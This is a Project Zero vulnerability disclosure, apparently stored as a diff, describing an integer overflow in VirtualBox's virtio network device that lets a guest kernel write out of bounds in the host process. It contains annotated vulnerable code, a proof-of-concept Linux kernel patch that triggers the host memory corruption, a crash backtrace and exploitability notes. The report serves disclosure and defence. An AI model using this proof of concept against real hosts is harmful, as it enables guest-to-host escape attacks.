@@ -1,0 +1,158 @@
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1136
+
+This is a vulnerability that affects VirtualBox VMs that use a virtio
+network adapter (which is a non-standard configuration). It permits
+the guest kernel to write up to 4GB of controlled data out of bounds
+in the trusted userland host process.
+
+The bug is in the following code in
+src/VBox/Devices/Network/DevVirtioNet.cpp (comments starting with
+`//###` are by me):
+
+while (vqueuePeek(&pThis->VPCI, pQueue, &elem))
+{
+    unsigned int uOffset = 0;
+    if (elem.nOut < 2 || elem.aSegsOut[0].cb != uHdrLen)
+    {
+        [...]
+    }
+    else
+    {
+        unsigned int uSize = 0;
+        [...]
+        /* Compute total frame size. */
+        //### .cb members are attacker-controlled uint32_t.
+        //### addition is performed without overflow check.
+        for (unsigned int i = 1; i < elem.nOut; i++)
+            uSize += elem.aSegsOut[i].cb;
+        [...]
+        //### Assert() has no effect in release builds.
+        Assert(uSize <= VNET_MAX_FRAME_SIZE);
+        if (pThis->pDrv)
+        {
+            [...]
+            PPDMSCATTERGATHER pSgBuf;
+            //### undersized buffer is allocated here.
+            int rc = pThis->pDrv->pfnAllocBuf(pThis->pDrv, uSize, pGso, &pSgBuf);
+            if (RT_SUCCESS(rc))
+            {
+                Assert(pSgBuf->cSegs == 1);
+                /* Assemble a complete frame. */
+                for (unsigned int i = 1; i < elem.nOut; i++)
+                {
+                    //### memory corruption happens here.
+                    PDMDevHlpPhysRead(pThis->VPCI.CTX_SUFF(pDevIns), elem.aSegsOut[i].addr,
+                                      ((uint8_t*)pSgBuf->aSegs[0].pvSeg) + uOffset,
+                                      elem.aSegsOut[i].cb);
+                    uOffset += elem.aSegsOut[i].cb;
+                }
+                [...]
+            }
+            else
+            {
+                [...]
+            }
+            [...]
+        }
+    }
+    [...]
+}
+
+This code basically takes an IO vector (`elem.aSegsOut`) from the
+guest, allocates a buffer (`pSgBuf`) that is large enough to hold the
+concatenation of all elements of the IO vector, then copies data from
+the IO vector into the newly allocated buffer. The issue here is that
+the lengths from the IO vector are summed up without overflow
+checking. If the total length of the IO vector is over 4GB, `uSize`
+wraps around, causing the allocated buffer to be up to 4GB smaller
+than the data that is copied into it.
+
+The reason why the amount of data that is written out of bounds can be
+less than 4GB is that uOffset is also only 32 bits wide, causing the
+start offsets of the IO vector elements to wrap.
+
+A VM does not need to have 4GB of memory to be able to trigger the bug.
+
+
+To reproduce, create a VM with 2GB of RAM, configure the VM to use
+virtio, then run a Linux system with the following kernel patch
+applied inside the VM:
+
+# git show --format=oneline HEAD
+0722f57bfae9abbc673b9dbe495c7da2f64676ea Merge tag 'drm-fixes-for-v4.10-final' of git://people.freedesktop.org/~airlied/linux
+# git diff
+diff --git a/drivers/virtio/virtio_ring.c b/drivers/virtio/virtio_ring.c
+index 409aeaa..7eca030 100644
+--- a/drivers/virtio/virtio_ring.c
++++ b/drivers/virtio/virtio_ring.c
+@@ -271,6 +271,7 @@ static inline int virtqueue_add(struct virtqueue *_vq,
+        unsigned int i, n, avail, descs_used, uninitialized_var(prev), err_idx;
+        int head;
+        bool indirect;
++       int attack_i;
+ 
+        START_USE(vq);
+ 
+@@ -301,7 +302,7 @@ static inline int virtqueue_add(struct virtqueue *_vq,
+ 
+        /* If the host supports indirect descriptor tables, and we have multiple
+         * buffers, then go indirect. FIXME: tune this threshold */
+-       if (vq->indirect && total_sg > 1 && vq->vq.num_free)
++       if (false)
+                desc = alloc_indirect(_vq, total_sg, gfp);
+        else
+                desc = NULL;
+@@ -316,7 +317,7 @@ static inline int virtqueue_add(struct virtqueue *_vq,
+                indirect = false;
+                desc = vq->vring.desc;
+                i = head;
+-               descs_used = total_sg;
++               descs_used = total_sg + 4;
+        }
+ 
+        if (vq->vq.num_free < descs_used) {
+@@ -346,6 +347,13 @@ static inline int virtqueue_add(struct virtqueue *_vq,
+                        i = virtio16_to_cpu(_vq->vdev, desc[i].next);
+                }
+        }
++       for (attack_i = 0; attack_i < 4; attack_i++) {
++               desc[i].flags = cpu_to_virtio16(_vq->vdev, VRING_DESC_F_NEXT);
++               desc[i].addr = cpu_to_virtio64(_vq->vdev, 0x100000);
++               desc[i].len = cpu_to_virtio32(_vq->vdev, 0x40000000);
++               prev = i;
++               i = virtio16_to_cpu(_vq->vdev, desc[i].next);
++       }
+        for (; n < (out_sgs + in_sgs); n++) {
+                for (sg = sgs[n]; sg; sg = sg_next(sg)) {
+                        dma_addr_t addr = vring_map_one_sg(vq, sg, DMA_FROM_DEVICE);
+
+
+As soon as the VM tries to talk to the network, the VM will crash.
+In a test with VirtualBox 5.1.14 r112924, a segfault occured with the
+following backtrace:
+
+(gdb) bt
+#0  __memcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:37
+#1  0x00007f6896620cbe in PGMPhysRead () from /usr/lib/virtualbox/components/VBoxVMM.so
+#2  0x00007f685416cb9d in ?? () from /usr/lib/virtualbox/VBoxDD.so
+#3  0x00007f685416cfea in ?? () from /usr/lib/virtualbox/VBoxDD.so
+#4  0x00007f689657434e in ?? () from /usr/lib/virtualbox/components/VBoxVMM.so
+#5  0x00007f6896576fc0 in TMR3TimerQueuesDo () from /usr/lib/virtualbox/components/VBoxVMM.so
+#6  0x00007f689657fa99 in ?? () from /usr/lib/virtualbox/components/VBoxVMM.so
+#7  0x00007f6896580a63 in ?? () from /usr/lib/virtualbox/components/VBoxVMM.so
+#8  0x00007f689650cd09 in ?? () from /usr/lib/virtualbox/components/VBoxVMM.so
+#9  0x00007f6896580cd4 in ?? () from /usr/lib/virtualbox/components/VBoxVMM.so
+#10 0x00007f68a5a6981c in ?? () from /usr/lib/virtualbox/VBoxRT.so
+#11 0x00007f68a5aedc7c in ?? () from /usr/lib/virtualbox/VBoxRT.so
+#12 0x00007f68a6397184 in start_thread (arg=0x7f6875af6700) at pthread_create.c:312
+#13 0x00007f68a5ec037d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:111
+
+
+Regarding exploitability: I have not investigated exploitability in
+detail; however, I believe that this issue is probably exploitable.
+For example, if the network interface is a NAT interface,
+drvNATNetworkUp_AllocBuf() is used to allocate the buffer, which in
+the pGso!=NULL case will allocate an arbitrarily-sized buffer with
+RTMemAlloc(), which should allow arbitrarily-sized allocations,
+permitting an out-of-bounds write behind a big heap allocation with
+fully controlled length and data.
